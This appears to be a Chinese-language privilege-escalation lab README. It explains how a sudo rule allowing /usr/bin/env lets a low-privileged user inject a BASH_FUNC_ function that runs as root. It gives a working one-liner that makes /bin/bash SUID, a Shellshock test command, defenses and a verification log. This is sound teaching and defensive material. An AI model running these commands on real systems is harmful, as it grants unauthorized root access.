# BASH_FUNC_ 环境函数劫持

## 原理

bash 允许通过环境变量传递**函数定义**（`export -f func`），环境变量名形如
`BASH_FUNC_func%%`。当 root 的 bash 进程继承了该环境变量时，会把变量内容解析
成函数并定义——攻击者可以把环境变量伪装成函数定义，让 root 的 bash 执行恶意
函数体。CVE-2014-6271（Shellshock）就是此类问题的极致形态。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：lowpriv 可 NOPASSWD 执行 /usr/bin/env（sudo 以 root 执行 bash 时继承环境变量）

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/bash-func-hijack        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it bash-func-hijack su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 注入函数定义 (sudo env 以 root 执行 bash, 继承环境变量)
sudo env 'BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }' bash -c pwn
# 预期: uid=0(root) gid=0(root)   函数体以 root 执行!

# 2. 验证提权
/bin/bash -p -c 'id'
# 预期: euid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：理解环境变量传递函数机制

bash 支持通过环境变量传递函数定义：
```bash
export -f myfunc    # 把函数 myfunc 导出到环境变量
env | grep BASH_FUNC
# 预期: BASH_FUNC_myfunc%%=() { ... }
```

函数在环境变量里的名字是 `BASH_FUNC_函数名%%`。当另一个 bash 进程继承了这个
环境变量，它会把内容**解析成函数**——攻击者可以伪造这个变量，让 root 的 bash
执行任意函数体。

### 第二步：构造并注入

```bash
sudo env 'BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }' bash -c pwn
```

拆解：
- `sudo env '...' bash -c pwn`：sudo 以 root 执行 bash，环境变量原样传入
- `BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }`：伪装成"函数 pwn 的定义"
- root 的 bash 解析该变量 → 定义了函数 pwn → `bash -c pwn` 调用它
- **函数体以 root 执行**：chmod u+s /bin/bash 成功

### 第三步：验证

```bash
/bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 历史背景：Shellshock（CVE-2014-6271）

2014 年的 Shellshock 就是此类问题的极致形态：bash 解析环境变量函数定义时存在
命令注入，通过 CGI 环境变量远程触发，影响全球数百万台服务器。
本实验是同一机制在 sudo 场景的温和利用。

### 防御

- 不授权 env 类命令的 sudo 权限
- 对 setuid/sudo 场景严格清理环境变量
- 及时更新 bash（Shellshock 修复后对函数定义解析更严格）

为什么能成功

- `env 'BASH_FUNC_pwn%%=() { ... }'` 设置环境变量
- sudo 以 root 执行 bash 时继承该变量, bash 解析出函数 pwn
- `bash -c pwn` 调用它, 函数体 `chmod u+s /bin/bash` 以 root 执行

## 防御

- sudo 场景限制 env 类命令的授权
- 对 setuid 程序严格清理环境变量


## 扩展教学（网络搜索整理）

### Shellshock 机制详解（本技术的"亲爹"）

2014 年的 CVE-2014-6271（Shellshock）是环境变量函数注入的经典灾难：

**漏洞成因**：bash 导出函数时，把函数定义**原样塞进环境变量**。bash 启动时
扫描环境变量，看到内容以 `() {` 开头就**解析执行**。老版本 bash 解析时
不检查函数定义是否结束——`}` 之后追加的命令也会被执行！

**验证命令**（老版本输出 vulnerable）：
```bash
env x='() { :;}; echo vulnerable' bash -c 'echo test'
```

**影响面**：任何把外部输入放进环境变量再调 bash 的服务都能打——
Apache CGI、SSH ForceCommand、DHCP 客户端、qmail……

**修复**（bash43-027）：导出函数的环境变量名强制改为
`BASH_FUNC_函数名%%` 格式，且只解析这种命名——攻击者无法再通过
任意变量名注入函数定义。本实验的 `BASH_FUNC_pwn%%` 正是这个格式。

### 与 Shellshock 的区别

| | Shellshock (CVE-2014-6271) | 本实验 |
|:---|:---|:---|
| 漏洞位置 | bash 解析器不检查函数定义边界 | 配置问题: sudo 允许 env |
| 触发 | 任意环境变量 + 任意 bash | sudo 环境变量透传 |
| 现状 | 已修复 | 需要 sudo 配置配合 |

### 为什么 sudo env 能带环境变量

sudo 默认 env_reset 清理环境，但显式 `env 'VAR=value'` 作为**要执行的
命令参数**传给 sudo 时，sudo 按规则（NOPASSWD: /usr/bin/env）执行 env
——env 再把变量注入到以 root 运行的 bash。

### 防御

- 不授权 env 类命令 sudo 权限
- setuid/sudo 边界严格清理环境变量
- 保持 bash 更新（修复后只解析 BASH_FUNC_%% 命名）

## 验证记录

2026-08-26 真实环境验证：`sudo env 'BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }' bash -c pwn`
输出 `uid=0(root) gid=0(root)`，/bin/bash 变 SUID，`bash -p` 得到 euid=0。复现成功。
